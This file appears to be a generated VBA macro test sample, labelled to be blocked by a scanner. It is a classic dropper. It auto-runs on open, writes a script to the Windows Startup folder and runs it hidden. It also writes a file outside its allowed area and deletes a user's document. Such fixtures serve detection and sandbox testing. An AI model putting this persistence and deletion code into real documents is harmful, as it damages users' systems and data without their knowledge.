' corpus-expect: blocked
' corpus-source: generated (classic dropper: writes a script to the Startup folder and runs it)
' corpus-allow-files: yes
' corpus-flagged: yes
Sub Auto_Open()
    Main
End Sub

Sub Main()
    Dim f As Integer, p As String
    On Error Resume Next
    p = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"
    f = FreeFile
    Open p For Output As #f
    Print #f, "CreateObject(""WScript.Shell"").Run ""calc.exe"""
    Close #f
    Shell "wscript.exe """ & p & """", vbHide
    Open "%OUTSIDE%\secret.txt" For Output As #f
    Print #f, "owned"
    Close #f
    Kill "%HOME%\Documents\report.docx"
End Sub
